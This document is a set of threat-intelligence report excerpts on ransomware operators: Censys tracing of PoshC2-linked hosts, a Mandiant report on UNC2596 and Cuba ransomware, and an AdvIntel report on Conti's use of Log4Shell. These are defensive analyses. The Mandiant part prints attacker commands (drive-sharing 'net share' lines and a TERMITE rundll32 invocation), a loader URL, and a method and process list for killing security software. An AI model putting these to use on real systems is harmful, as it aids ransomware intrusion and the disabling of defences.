The same Python software as Hosts F and G as well as a different \nmalware kit were observed on the host as recently as 28 June 2022. A direct malware \nanalysis could not be performed since, at the time of Censys’ discovery of the host, the \nport on which the malware package was located, 443, was closed. The kit contained \n155 files, several of which were identified as malicious by JoeSandbox and Hybrid \nAnalysis but no direct links to ransomware was identified. A full file list can be found in \nAppendix C.\n\nCensys ran Google searches for the files included in the kit, and found matches to a \nhost - Host H - based in the UK, but on Russian network Selectel, via a Pastebin drop \ndated 19 July 2021. Censys performed an historical analysis on Host H and confirmed \nexistence of the malware files at the same time as well as a PoshC2 certificate on port \n443 on 17 September 2021 (this host was not observed during the original PoshC2 \ncertificate search as this host had closed port 443 at the time of said search). Censys \nused JoeSandbox and Hybrid Analysis to confirm the malware and identified ties to \nransomware.  A full malware list can be found in Appendix D. This host is currently listed \nas based in St. Petersburg, Russia and was identified by @r3dbU7z on Twitter as part of \nthe MedusaLocker group. \n\nAdditionally, Apache HTTPD software on port 443 was observed on Virginia Host E as \nrecently as 25 June 2022. According to PoshC2 documentation, an attacker can use \nApache software on a proxy host to silently redirect traffic to the C2 server and \nattacker from the target, without the target host knowing. This would serve to hide the \norigin of the true attacker. It is possible that the Virginia host was or is functioning as \nsuch a proxy within the US so as to be trusted by other US-based potential victim hosts, \nhowever, Censys does not possess the data to confirm this.\n\nNettitude Labs\n\nhttps://search.censys.io/hosts/34.235.5.141?at_time=2022-06-29T21%3A00%3A22.398Z\nhttps://pastebin.com/i2MB7tFb\nhttps://search.censys.io/hosts/62.182.158.226?at_time=2021-09-17T09%3A59%3A21.069Z\nhttps://www.hybrid-analysis.com/sample/591153a47beb8f657b0209eaf8a0aa91721965645cbffba13c7991d6591331cb\nhttps://search.censys.io/hosts/62.182.158.226\nhttps://twitter.com/r3dbU7z/status/1418433910057353217\nhttps://search.censys.io/hosts/34.235.5.141?q=services.tls.certificates.leaf_data.subject_dn%3D%60C%3DUS%2C+ST%3DMinnesota%2C+L%3DMinnetonka%2C+O%3DPajfds%2C+OU%3DJethpro%2C+CN%3DP18055077%60&resource=hosts&at_time=2022-06-26T12%3A46%3A09.789Z\nhttps://labs.nettitude.com/tools/poshc2/poshc2-documentation/\n\n\n17\n\nHosts E & H with PoshC2 \n\nNettitude Labs\n\n\n\n18\n\nHosts L thru O with PoshC2 \nCensys observed Hosts L through O each with a PoshC2 certificate, but did not find \ndirectories similar to other hosts with confirmed malware kits. \n\nHowever, Censys did observe Apache software on Hosts L, M and O which PoshC2 \ndocumentation states an attacker can use on a proxy host to silently redirect traffic \nto a C2 server and attacker from the target, without the target host knowing, as \npreviously stated for Host E on page 16. This fact is a possible indicator that Hosts L \nthrough O could be currently or are intended to be used as C2 proxies, but this \npossible indicator alone is not enough to conclude that these hosts are or will \nfunction as C2 proxies. It should also be noted that, similar to Host H, Censys observed \nHost O geographically in the Netherlands, but on Russian virtual dedicated server \nprovider VDSINA-NL (RU) with known server locations in both Russia and the \nNetherlands. This fact is merely an additional indicator of possible Russian        \n                                                                   control/presence on the host.\n\nNettitude Labs\n\nhttps://search.censys.io/search?q=autonomous_system.name%3D%60VDSINA-NL%60&resource=hosts\nhttps://www.websiteplanet.com/web-hosting/vdsina-ru/\n\n\nThe discovery of Metasploit on Host A uncovered the tool Deimos C2. A Censys search \non the JARM fingerprint of Deimos C2 uncovered Host D with the same tool, but also a \nweb proxy which can be used to hide the identity of a true attacker, and a piece of \nmalware in October 2021 tied to the Karma ransomware group. Censys’ assumption is \nthat, while we are currently unable to tie Host D to any attack, the intent of the host \nwas to levy its ransomware kit against targets.\n\nThe fact that both Host D and original Host A both had the Deimos C2 tool can be \nconsidered coincidental. However, the fact that Host D’s malware directory format and \nPython software mirrored that of MedusaLocker-linked Hosts F and G, and that both of \nthose hosts not only possessed confirmed ransomware but also linked back to Host A \nvia the PoshC2 certificate, could mean that Host D was functioning as a proxy for Host \nA. However, Censys was unable to observe Deimos C2 on Host A during or before the \nOctober 2021 timeframe during which Host D possessed malware. Chinese Host C did \nhave the Deimos C2 JARM during this time period, but no other indicators of Deimos \nC2 or malware.\n\nCensys assesses that Hosts F and G, however, are confirmed ransomware hosts that \nare either functioning as original attackers or as C2 servers/nodes due to the \nconfirmed ransomware on both hosts and Host F’s possession of a file that points to \nBitcoin Hosts I & J, presumably for ransomware victims to pay the ransom in Bitcoin. \nThe link of Hosts F and G to initial Host A is circumstantial based only on the existence \nof the PoshC2 certificate and being hosted in Russia - further analysis with other data \ntypes is required to conclude or rule out any direct connection.\n\nHosts E and H share the PoshC2 certificate circumstantial tie to Host A, but share with \neach other, a similar malware kit. While Host E’s malware kit was not directly tied to \nransomware, Host H’s was and the files, while similar, seemed to be modified. Censys \nsuspcets these two hosts are/were used as C2 proxies, especially as Host H was \npreviously hosted in the UK but via a Russian network provider and is now listed as \nbased in Russia.\n\nCensys leveraged its own temporal visibility of worldwide hosts to find hosts with \ncyber exploitation tools and C2 tools and then pivot within its own data to uncover \nhosts related to those tools, possessing proxy software, and malware kits. While many \nconnections are circumstantial, Censys is certain that it uncovered Hosts F and G are \nfully capable of carrying out ransomware attacks and funnelling Bitcoin payment to \nHosts I and J.

UNC2596, a threat actor that deploys COLDDRAW ransomware, publicly known as Cuba Ransomware, exemplifies this trend. While\n\npublic reporting has highlighted CHANITOR campaigns as precursor for these ransomware incidents, Mandiant has also identified the\n\nexploitation of Microsoft Exchange vulnerabilities, including ProxyShell and ProxyLogon, as another access point leveraged by UNC2596 likely\n\nas early as August 2021. The content of this blog focuses on UNC2596 activity which has led to the deployment of COLDDRAW ransomware.\n\nUNC2596 is currently the only threat actor tracked by Mandiant that uses COLDDRAW ransomware, which may suggest it’s exclusively used\n\nby the group. During intrusions, these threat actors have used webshells to load the TERMITE in-memory dropper with subsequent activity\n\ninvolving multiple backdoors and built-in Windows utilities. Beyond commonplace tools, like Cobalt Strike BEACON and NetSupport,\n\nUNC2596 has used novel malware, including BURNTCIGAR to disable endpoint protection, WEDGECUT to enumerate active hosts, and the\n\nBUGHATCH custom downloader. In incidents where COLDDRAW was deployed, UNC2596 used a multi-faceted extortion model where data is\n\nstolen and leaked on the group's shaming website, in addition to encryption using COLDDRAW ransomware. COLDDRAW operations have\n\nimpacted dozens of organizations across more than ten countries, including those within critical infrastructure.\n\nVictimology\n\nThe threat actors behind COLDDRAW ransomware attacks have not shied away from sensitive targets (Figure 1). Their victims include utilities\n\nproviders, government agencies, and organizations that support non-profits and healthcare entities, however, we have not observed them\n\nattacking hospitals or entities that provide urgent care. Around 80% of impacted victim organizations are based in North America, but they\n\nhave also impacted several countries in Europe as well as other regions (Figure 2).\n\nFigure 1: Alleged COLDDRAW victims by industry\n\nhttps://www.mandiant.com/resources/unc2596-cuba-ransomware\nhttps://www.ic3.gov/Media/News/2021/211203-2.pdf\nhttps://www.mandiant.com/resources/pst-want-shell-proxyshell-exploiting-microsoft-exchange-servers\nhttps://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/\n\n\n2/12\n\nFigure 2: Alleged COLDDRAW victims by country\n\nShaming Website\n\nSince at least early 2021, COLDDRAW ransomware victims have been publicly extorted by the threat actors who threaten to publish or sell\n\nstolen data (Figure 3). Each shaming post includes information on the “date the files were received.” While the shaming site was not included\n\nin ransom notes until early 2021, one of the entries on the site states that the files were received in November 2019. This is consistent with\n\nearliest samples uploaded to public malware repositories and may represent the earliest use of the ransomware. Notably, while the data\n\nassociated with most of the victims listed on this site are provided for free, there is a paid section which listed only a single victim at the time of\n\npublication.\n\nFigure 3: Cuba (aka COLDDRAW) Ransomware Shaming Tor site (2021-12-31)\n\nAttack Lifecycle\n\nUNC2596 incidents that have led to COLDDRAW ransomware deployment have involved a mix of public and private tools, some of which are\n\nbelieved to be private to them. The threat actors use several malware and utilities that are publicly available including NetSupport, Cobalt\n\nStrike BEACON, built-in Windows capabilities such as PsExec, RDP, and PowerShell, malware available for purchase such as WICKER, and\n\nexploits with publicly available proof-of-concept code. UNC2596 also uses several tools and scripts that we have not observed in use by other\n\nthreat activity clusters to date, including BUGHATCH, BURNTCIGAR, WEDGECUT, and COLDDRAW. See the “Notable Malware and Tools”\n\nsection for additional detail.\n\nInitial Reconnaissance / Initial Compromise\n\nMandiant has observed UNC2596 frequently leverage vulnerabilities affecting public-facing Microsoft Exchange infrastructure as an initial\n\ncompromise vector in recent COLDDRAW intrusions s where the initial vector was identified. The threat actors likely perform initial\n\nreconnaissance activities to identify Internet-facing systems that may be vulnerable to exploitation.\n\n\n\n3/12\n\nEstablish Foothold\n\nIn COLDDRAW ransomware incidents, where initial access was gained via Microsoft Exchange vulnerabilities, UNC2596 subsequently\n\ndeployed webshells to establish a foothold in the victim network. Mandiant has also observed these actors deploy a variety of backdoors to\n\nestablish a foothold, including the publicly available NetSupport RAT, as well as BEACON and BUGHATCH, which have been deployed using\n\nthe TERMITE in-memory dropper.\n\nEscalate Privileges\n\nCOLDDRAW ransomware incidents have mainly involved the use of credentials from valid accounts to escalate privileges. In some cases, the\n\nsource of these credentials is unknown, while in other cases, UNC2596 leveraged credential theft tools such as Mimikatz and WICKER. We\n\nhave also observed these threat actors manipulating or creating Windows accounts and modifying file access permissions. In one intrusion,\n\nUNC2596 created a user account and added it to the administrator and RDP groups.\n\nInternal Reconnaissance\n\nUNC2596 has performed internal reconnaissance with the goals of identifying active network hosts that are candidates for encryption and\n\nidentifying files to exfiltrate for use in their multi-faceted extortion scheme. The threat actors have used WEDGECUT, a reconnaissance tool\n\ntypically with the filename check.exe. It identifies active hosts by sending PING requests to a list of hosts generated by a PowerShell script\n\nnamed comps2.ps1 which uses the Get-ADComputer cmdlet to enumerate the Active Directory. The threat actors have interactively browsed\n\nfile systems to identify files of interest. Additionally, UNC2596 has routinely used a script named shar.bat to map all drives to network shares,\n\nwhich may assist in user file discovery (Figure 4).\n\nFigure 4: UNC2596 used a batch script to\nenable sharing of all drives to facilitate\n\nencryption and data harvesting\n\nnet share C=C:\\ /grant:everyone,FULL\n\nnet share D=D:\\ /grant:everyone,FULL\n\nnet share E=E:\\ /grant:everyone,FULL\n\nnet share F=F:\\ /grant:everyone,FULL\n\nnet share G=G:\\ /grant:everyone,FULL\n\nnet share H=H:\\ /grant:everyone,FULL\n\nnet share I=I:\\ /grant:everyone,FULL\n\nnet share J=J:\\ /grant:everyone,FULL\n\nnet share L=L:\\ /grant:everyone,FULL\n\nnet share K=K:\\ /grant:everyone,FULL\n\nnet share M=M:\\ /grant:everyone,FULL\n\nnet share X=X:\\ /grant:everyone,FULL\n\nnet share Y=Y:\\ /grant:everyone,FULL\n\nnet share W=W:\\ /grant:everyone,FULL\n\nnet share Z=Z:\\ /grant:everyone,FULL\n\nnet share V=V:\\ /grant:everyone,FULL\n\nnet share O=O:\\ /grant:everyone,FULL\n\nnet share P=P:\\ /grant:everyone,FULL\n\nnet share Q=Q:\\ /grant:everyone,FULL\n\nnet share R=R:\\ /grant:everyone,FULL\n\nnet share S=S:\\ /grant:everyone,FULL\n\nnet share T=T:\\ /grant:everyone,FULL\n\nMove Laterally/Maintain Presence\n\n\n\n4/12\n\nDuring COLDDRAW incidents, UNC2596 actors have used several methods for lateral movement including RDP, SMB, and PsExec, frequently\n\nusing BEACON to facilitate this movement. Following lateral movement, the threat actors deploy various backdoors including the publicly\n\navailable NetSupport RAT, as well as BEACON and BUGHATCH, which are often deployed using the TERMITE in-memory dropper. These\n\nbackdoors are sometimes executed using PowerShell launchers and have in some cases used predictable filenames. For example, NetSupport-\n\nrelated scripts and executables observed during COLDDRAW incidents have typically used the filename ra or ra<#> whereas BUGHATCH\n\nscripts and executables have used the filename komar or komar<#>, followed by the appropriate extension.\n\nComplete Mission\n\nIn order to complete their mission of multi-faceted extortion, the UNC2596 attempts to steal relevant user files and then identify and encrypt\n\nnetworked machines. To facilitate encryption, and possibly to assist with collection efforts, the threat actors have used a batch script named\n\nshar.bat which maps each drive to a network share (Figure 4). These newly created shares are then available for encryption by COLDDRAW.\n\nDuring a more recent intrusion involving COLDDRAW, UNC2596 deployed the BURNTCIGAR utility using a batch script named av.bat.\n\nBURNTCIGAR is a utility first observed in November 2021 which terminates processes associated with endpoint security software to allow\n\ntheir ransomware and other tools to execute uninhibited. UNC2596 has also been observed exfiltrating data prior to encrypting victim systems.\n\nTo date, we have not observed UNC2596 using any cloud storage providers for data exfiltration; rather, they prefer to exfiltrate data to their\n\nBEACON infrastructure. The threat actors then threaten to publish data of organizations that do not pay a ransom on their shaming site\n\n(Figure 5).\n\nFigure 5: Sample COLDDRAW Ransom Note\n\nGood day.

This utility’s functionality is implemented using the IcmpCreateFile,\n\nIcmpSendEcho, and IcmpCloseFile APIs to send a buffer containing the string “Date Buffer”. In practice, the list provided to WEDGECUT has\n\nbeen generated using a PowerShell script that enumerates the Active Directory using the Get-ADComputer cmdlet.\n\nBUGHATCH\n\nBUGHATCH is a downloader that executes arbitrary code on the compromised system downloaded from a C&C server. The code sent by the\n\nC&C server includes PE files and PowerShell scripts. BUGHATCH has been loaded in-memory by a dropper written in PowerShell or loaded by\n\na PowerShell script from a remote URL.\n\nBURNTCIGAR\n\nBURNTCIGAR is a utility that terminates processes at the kernel level by exploiting an Avast driver’s undocumented IOCTL code (Table 1). The\n\nmalware terminates targeted processes using the function DeviceIoControl to exploit the undocumented 0x9988C094 IOCTL code of the Avast\n\ndriver, which calls ZwTerminateProcess with the given process identifier. We have observed a batch script launcher that creates and starts a\n\nkernel service called aswSP_ArPot2 loading binary file C:\\windows\\temp\\aswArPot.sys (legitimate Avast driver with SHA256 hash\n\n4b5229b3250c8c08b98cb710d6c056144271de099a57ae09f5d2097fc41bd4f1).\n\nTo deploy BURNTCIGAR at a victim, the actor brings their own copy of the vulnerable Avast driver and installs it at a service.\n\n\n\n5/12\n\nExecutable Processes Killed by BURNTCIGAR\n\nSentinelHelperService.exe iptray.exe dsa-connect.exe\n\nSentinelServiceHost.exe ccSvcHst.exe ResponseService.exe\n\nSentinelStaticEngineScanner.exe sepWscSvc64.exe avp.exe\n\nSentinelAgent.exe SEPAgent.exe avpsus.exe\n\nSentinelAgentWorker.exe ssDVAgent.exe klnagent.exe\n\nSentinelUI.exe smcgui.exe vapm.exe\n\nSAVAdminService.exe PAUI.exe VsTskMgr.exe\n\nSavService.exe ClientManager.exe mfemms.exe\n\nSEDService.exe SBPIMSvc.exe mfeann.exe\n\nAlsvc.exe SBAMSvc.exe macmnsvc.exe\n\nSophosCleanM64.exe VipreNis.exe masvc.exe\n\nSophosFS.exe SBAMTray.exe macompatsvc.exe\n\nSophosFileScanner.exe RepMgr.exe UpdaterUI.exe\n\nSophosHealth.exe RepUtils.exe mfemactl.exe\n\nMcsAgent.exe scanhost.exe McTray.exe\n\nMcsClient.exe RepUx.exe cpda.exe\n\nSophosSafestore64.exe PccNtMon.exe IDAFServerHostService.exe\n\nSophosSafestore.exe svcGenericHost.exe epab_svc.exe\n\nSSPService.exe pccntmon.exe epam_svc.exe\n\nswc_service.exe HostedAgent.exe cptrayLogic.exe\n\nswi_service.exe tmlisten.exe EPWD.exe\n\nSophosUI.exe logWriter.exe FSAgentService.exe\n\nSophosNtpService.exe ntrtscan.exe RemediationService.exe\n\nhmpalert.exe TmCCSF.exe TESvc.exe\n\nSophosLiveQueryService.exe TMCPMAdapter.exe cptrayUI.exe\n\nSophosOsquery.exe coreServiceShell.exe EFRService.exe\n\n\n\n6/12\n\nTable 1: Processes Killed by BURNTCIGAR\n\nSophosFIMService.exe coreFrameworkHost.exe MBCloudEA.exe\n\nswi_fc.exe ds_monitor.exe MBAMService.exe\n\nSophosMTRExtension.exe CloudEndpointService.exe Endpoint Agent Tray.exe\n\nsdcservice.exe CETASvc.exe EAServiceMonitor.exe\n\nSophosCleanup.exe EndpointBasecamp.exe MsMpEng.exe\n\nSophos UI.exe WSCommunicator.exe AvastSvc.exe\n\nSavApi.exe dsa.exe aswToolsSvc.exe\n\nsfc.exe Notifier.exe bcc.exe\n\nAvWrapper.exe WRSA.exe anet.exe\n\nbccavsvc.exe a.exe aus.exe\n\nAvastUI.exe\n\nCOLDDRAW\n\nCOLDDRAW is the name Mandiant uses to track the ransomware observed in Cuba Ransomware operations. This ransomware appends the\n\n.cuba file extension to encrypted files. When executed, it terminates services associated with common server applications and encrypts files on\n\nthe local filesystem and attached network drives using an embedded RSA key. Encrypted files are rewritten with a COLDDRAW-generated\n\nheader prior to the encrypted file contents. For large files, only the beginning and end of the file will be encrypted.\n\nTERMITE\n\nTERMITE is a password-protected memory-only dropper which contains an encrypted shellcode payload. Observed payloads have included\n\nBEACON, METASPLOIT stager, or BUGHATCH. TERMITE requires the actor to specify the ClearMyTracksByProcess export and supply a\n\npassword as a command line option to operate successfully (Figure 6). Mandiant suspects that TERMITE may be available to multiple groups\n\nand is not exclusively used by UNC2596.\n\nFigure 6: TERMITE command line execution\n\nRundll32.exe c:\\windows\\temp\\komar.dll,ClearMyTracksByProcess 11985756\n\nTracking TERMITE\n\nDuring UNC2596 intrusions involving COLDDRAW, the actors load tools and malware from web accessible systems that were also typically\n\nused for BEACON. Over a period of approximately six months, Mandiant Advanced Practices tracked a TERMITE loader at\n\nhxxp://45.32.229[.]66/new.dll which used the password 11985756 to decode various BEACON payloads. Ongoing analysis of TERMITE\n\npayloads collected during this timeframe showed that TERMITE underwent modifications to evade detections. UNC2596 also began using the\n\nTERMITE password 11985757 in October 2021.\n\nCHANITOR Overlaps\n\nMandiant has not responded to any intrusions where we have directly observed CHANITOR malware lead to COLDDRAW ransomware;\n\nhowever, we have identified overlaps between CHANITOR-related operations and COLDDRAW incidents. These include infrastructure\n\noverlaps, common code signing certificates, use of a shared packer, and naming similarities for domains, files, and URL paths, among others.\n\nThe code signing certificate with the Common Name FDFWJTORFQVNXQHFAH has been used to sign COLDDRAW payloads, as well as\n\nSENDSAFE payloads distributed by CHANITOR. Mandiant has not observed the certificate used by other threat actors.\n\nCOLDDRAW payloads and SENDSAFE payloads distributed by CHANITOR have used a shared packer that we refer to as LONGFALL.\n\nLONGFALL, which is also known as CryptOne, has been used with a variety of malware families.\n\nhttps://advantage.mandiant.com/malware/malware--01557594-ac1c-5a17-8619-ae0c05508133\n\n\n7/12\n\nThe WICKER stealer has been used in both CHANITOR-related post-exploitation activity and COLDDRAW incidents, including samples\n\nsharing the same command and control (C&C) server.\n\nPayloads distributed through CHANITOR and payloads identified in COLDDRAW ransomware incidents have masqueraded as the same\n\nlegitimate applications including mDNSResponder and Java.\n\nPublic reporting has also highlighted some overlaps between COLDDRAW and ZEPPELIN, another ransomware that has reportedly been\n\ndistributed via CHANITOR.\n\nImplications\n\nAs the number of vulnerabilities identified and publicly disclosed continues to increase year after year, Mandiant has also observed an increase\n\nin the use of vulnerabilities as an initial compromise vector by ransomware threat actors including utilizing both zero-day and n-day\n\nvulnerabilities in their activity; notable examples include UNC2447 and FIN11. Shifting towards vulnerabilities for initial access could offer\n\nthreat actors more accurate targeting and higher success rates when compared to malicious email campaigns, which rely more on\n\nuncontrollable factors, such as victims’ interacting with malicious links or documents. The rise in zero-day usage specifically could be reflective\n\nof significant funds and resources at the disposal of ransomware operators, which are being directed towards exploit research and development\n\nor the purchasing of exploits from trusted brokers. However, threat actors do not have to use zero-days to be effective. A subset of n-day\n\nvulnerabilities are often considered attractive targets for threat actors due to their impact of publicly exposed products, ability to facilitate code\n\nexecution after successful exploitation, and the availability of significant technical details and/or exploit code in public venues. As the number\n\nof vulnerabilities publicly disclosed continues to rise, we anticipate threat actors, including ransomware operators, to continue to exploit\n\nvulnerabilities in their operations.\n\nAcknowledgements\n\nWith thanks toThomas Pullen and Adrian Hernandez for technical research, and Nick Richard for technical review.\n\nMITRE ATT&CK\n\nMandiant has observed COLDDRAW activity involving the following techniques in COLDDRAW intrusions:\n\nATT&CK Tactic Category Techniques\n\nInitial Access    T1190:        Exploit Public-Facing Application\n\nDiscovery    T1010:        Application Window Discovery\n\n   T1012:        Query Registry\n\n   T1016:        System Network Configuration Discovery\n\n   T1018:        Remote System Discovery\n\n   T1033:        System Owner/User Discovery\n\n   T1057:        Process Discovery\n\n   T1082:        System Information Discovery\n\n   T1083:        File and Directory Discovery\n\n   T1087:        Account Discovery\n\n   T1518:        Software Discovery\n\nImpact    T1486:        Data Encrypted for Impact\n\n   T1489:        Service Stop\n\nCollection    T1056.001:    Keylogging\n\n   T1074.002:    Remote Data Staging\n\nhttps://blog.group-ib.com/hancitor-cuba-ransomware\nhttps://www.mandiant.com/resources/unc2447-sombrat-and-fivehands-ransomware-sophisticated-financial-threat\nhttps://advantage.mandiant.com/reports/22-00002779\n\n\n8/12\n\nTable 2: MITRE ATT&CK Framework\n\nDefense Evasion    T1027:        Obfuscated Files or Information\n\n   T1055:        Process Injection\n\n   T1055.003:    Thread Execution Hijacking\n\n   T1070.004:    File Deletion\n\n   T1112:        Modify Registry\n\n   T1134:        Access Token Manipulation\n\n   T1134.001:    Token Impersonation/Theft\n\n   T1140:        Deobfuscate/Decode Files or Information\n\n   T1497.001:    System Checks\n\n   T1553.002:    Code Signing\n\n   T1564.003:    Hidden Window\n\n   T1574.011:    Services Registry Permissions Weakness\n\n   T1620:        Reflective Code Loading\n\nPersistence    T1098:        Account Manipulation\n\n   T1136:        Create Account\n\n   T1136.001:    Local Account\n\n   T1543.003:    Windows Service\n\nCommand and Control    T1071.001:    Web Protocols\n\n   T1071.004:    DNS\n\n   T1095:        Non-Application Layer Protocol\n\n   T1105:        Ingress Tool Transfer\n\n   T1573.002:    Asymmetric Cryptography\n\nResource Development    T1583.003:    Virtual Private Server\n\n   T1587.003:    Digital Certificates\n\n   T1588.003:    Code Signing Certificates\n\n   T1608.001:    Upload Malware\n\n   T1608.002:    Upload Tool\n\n   T1608.003:    Install Digital Certificate\n\n   T1608.005:    Link Target\n\nExecution    T1053:        Scheduled Task/Job\n\n   T1059:        Command and Scripting Interpreter\n\n   T1059.001:    PowerShell\n\n   T1129:        Shared Modules\n\n   T1569.002:    Service Execution\n\nLateral Movement    T1021.001:    Remote Desktop Protocol\n\n   T1021.004:    SSH\n\nCredential Access    T1555.003:    Credentials from Web Browsers\n\n\n\n9/12\n\nMandiant Security Validation\n\nIn addition to previously released Actions, the Mandiant Security Validation (Validation) Behavior Research Team (BRT) has created\n\nVHR20220223, which will also be released today, for tactics associated with UNC2596.\n\nA102-561, Malicious File Transfer -

We urge all organizations to join\nus in this essential effort and take action. By bringing together key government and private\nsector partners via the JCDC, including our partners at the FBI and NSA, we will ensure that\nour country’s strongest capabilities are brought to bear in an integrated manner against this\nrisk.”\n\n \n\n\n\n3/9\n\nCISA’s concerning tone is understandable: the new vulnerability is not another hidden path\nfor a malicious attack. Embedded deeply in the stack level it offers the attackers an entire\nnew dimension of offensive patterns. The depth is transferred to scale as this vulnerability\naffects core library components supporting thousands of networks, companies, and\nmachines across the world.\n\n \n\nRecorded in the vulnerability database on Friday, November 26, 2021, the Apache Log4j2\nJava-based logging library vulnerability CVE-2021-44228 has the highest possible severity\nscore of Base Score: 10.0 CRITICAL allowing direct remote code execution on the\nvulnerable machines. Due to its core component impact, this vulnerability in some way can\nbe compared to the Apache Struts vulnerability CVE-2019-0230: Apache Struts OGNL\nRemote Code Execution that led to the breach of Equifax.\n\n \n\nMultiple technologies and products run Log4j2 library including popular vCenter, Kafka,\nElastic, and Minecraft presenting an attack surface for the attackers.\n\n \n\nThe current activity surrounding the vulnerability resulted in massive world scanning with the\npayloads running from miners, unix DDoS malware, and framework stagers pushed to the\ncompromised hosts.\n\n \n\nConti: A Quest For Ultimate Ransomware Exploitation\n\n \n\nNaturally, this new attack domain became the focal point of hackers’ interests. Hacker teams\nsuspected to work for foreign governments and US adversaries were quickly spotted to\ninvestigate Log4j2. And as the new adversarial pattern seen with ProxyLogon in March 2021\nsuggests, if one day a major CVE is spotted by APTs, the next week it is weaponized by\nransomware.\n\n \n\nAnd indeed, a week after the Log4j2 vulnerability became public, AdvIntel discovered the\nmost concerning trend - the exploitation of the new CVE by one of the most prolific organized\nransomware groups - Conti.\n\n \n\nhttps://www.fbi.gov/news/stories/chinese-hackers-charged-in-equifax-breach-021020\n\n\n4/9\n\nConti plays a special role in today’s threat landscape, primarily due to its scale. Divided on\nseveral teams and involving tenths of full-time members, the Russian-speaking Conti made\nover $150 million USD in the last six months, according to AdvIntel research into the\nransomware logs. And they continue to expand. It is this expansion that has set Conti on a\nlong quest of searching for new attack surfaces and methods. Since August, they have\nemployed many new means: hidden RMM backdoors, new backup removal solutions, and,\nmost recently, even an entire operation to revive Emotet.\n\n \n\nMoreover, Conti already had a history of leveraging exploits as an initial attack vector and for\nlateral movement. For instance, the group leverages Fortinet VPN vulnerability CVE-2018-\n13379 to target unpatched devices for the initial attack vector. Conti favors PrintNightmare\nprivilege elevation CVE-2021-34527/CVE-2021-1675, Zerologon (CVE-2020-1472), and\nms17-010 for local privilege elevation and lateral movement on the compromised hosts.\n\n \n\nAs such, Log4j2 vulnerability appears at a time for Conti: at the moment when the syndicate\nhas both the strategic intention and the capability to weaponize it for its ransomware goals.\n\n \n\nDiscovery: Conti Becomes The First Sophisticated Crimeware Ransomware Group\nWeaponizing Log4j2\n\n \n\n \n\nRansomware Exploitation Timeline: Conti Search for Newer Attack Vectors\n\nhttps://www.advintel.io/post/secret-backdoor-behind-conti-ransomware-operation-introducing-atera-agent\nhttps://www.advintel.io/post/backup-removal-solutions-from-conti-ransomware-with-love\nhttps://www.advintel.io/post/corporate-loader-emotet-history-of-x-project-return-for-ransomware\nhttps://www.crowdstrike.com/blog/cve-2020-1472-zerologon-security-advisory/\n\n\n5/9\n\nNovember 1, 2021 - Due to shrinking attack surfaces, Conti begins the quest to find\nnew attack vectors\n\nNovember 14, 2021 - Use of Emotet - CobaltStrike Chain for Attack\n\nNovember 19, 2021 - Conti Redesigns Their Infrastructure Aiming for New Expansion\n\nNovember 25, 2021 - Announcing New Conti Payload\n\nDecember 6, 2021 - R&D work on advancing botnet modules\n\nDecember 12, 2021 - Conti identifies Log4Shell as a novel possibility\n\nDecember 13, 2021 - Scanning activity for initial access\n\n\n\n6/9\n\nDecember 15, 2021 - Targeting of vCenter networks for lateral movement\n\nOn December 12, through deep visibility into adversarial collections, AdvIntel discovered that\nmultiple Conti group members expressed interest in the exploitation of the vulnerability for\nthe initial attack vector resulting in the scanning activity leveraging the publicly available\nLog4J2 exploit. This is the first time this vulnerability entered the radar of a major\nransomware group.\n\n \n\nThe current exploitation led to multiple use cases through which the Conti group tested the\npossibilities of utilizing the Log4J2 exploit. Most importantly, AdvIntel confirmed that the\ncriminals pursued targeting specific vulnerable Log4J2 VMware vCenter for lateral\nmovement directly from the compromised network resulting in vCenter access affecting US\nand European victim networks from the pre-existent Cobalt Strike sessions.\n\n \n\nEarly Warning: Ransomware Exploitation of Core Vulnerability\n\n \n\nIt is only a matter of time until Conti and possibly other groups will begin exploiting Log4j2 to\nits full capacity. It is recommended to patch the vulnerable system immediately and view the\nLog4j2 as a ransomware group exploitation vector.\n\n \n\n\n\n7/9\n\n \n\nAdvIntel provides direct customer access to targeting datasets related to CVE-2021-44228\nLog4Shell exploitation from the Conti ransomware list. The Log4Shell dataset informs\npossible targeted devices from vulnerability scanner devices only. Targeted Searches are\navailable using TLD & IP Range in Log4Shell Exposure Collections.\n\n \n\nRecommendations & Mitigations\n\nThe Dutch National Cyber Security Center shared a list of the affected software and\nrecommendations linked to each one of them - https://github.com/NCSC-\nNL/log4shell/tree/main/software\n\nCVE-2021-44228 - VMSA-2021-0028 Workaround instructions to address CVE-2021-\n44228 in vCenter Server and vCenter Cloud Gateway (87081) -\nhttps://kb.vmware.com/s/article/87081\n\nMitre ATT&CK\n\n \n\nEnterprise Attack - Course of Action\n\n\n\n8/9\n\nAccount Discovery Mitigation - T1087\n\nBrute Force Mitigation - T1110\n\nCredential Dumping Mitigation - T1003\n\nData Encrypted Mitigation - T1022\n\nData from Local System Mitigation - T1005\n\nExploitation for Defense Evasion Mitigation - T1211\n\nExploitation for Privilege Escalation Mitigation - T1068\n\nExploitation of Remote Services Mitigation - T1210\n\nNetwork Service Scanning Mitigation - T1046\n\nPowerShell Mitigation - T1086\n\nSupply Chain Compromise Mitigation - T1195\n\nAttack Pattern\n\nSpearphishing Attachment - T1193\n\nSupply Chain Compromise - T1195\n\nCommand-Line Interface - T1059\n\nPowerShell - T1086\n\nRundll32 - T1085\n\nRegsvr32 - T1117\n\nScripting - T1064\n\nData Encrypted for Impact - T1486\n\nData Encrypted - T1022\n\nRemote Access Tools - T1219\n\nDomain Fronting - T1172\n\nData from Local System - T1005\n\nData from Network Shared Drive - T1039\n\n\n\n9/9\n\nEmail Collection - T1114\n\nPass the Hash - T1075\n\nPass the Ticket - T1097\n\nLogon Scripts - T1037\n\nExploitation of Remote Services - T1210\n\nKerberoasting - T1208\n\nLLMNR/NBT-NS Poisoning and Relay - T1171\n\nCredentials in Files - T1081\n\nBrute Force - T1110\n\nNetwork Share Discovery - T1135\n\nFile and Directory Discovery - T1083\n\nDomain Trust Discovery - T1482\n\nProcess Hollowing - T1093\n\nProcess Doppelgänging - T1186\n\nProcess Injection - T1055\n\nNew Service - T1050\n\nExploitation for Privilege Escalation - T1068\n\nDisrupt ransomware attacks & prevent data stealing with AdvIntel’s threat disruption\nsolutions.

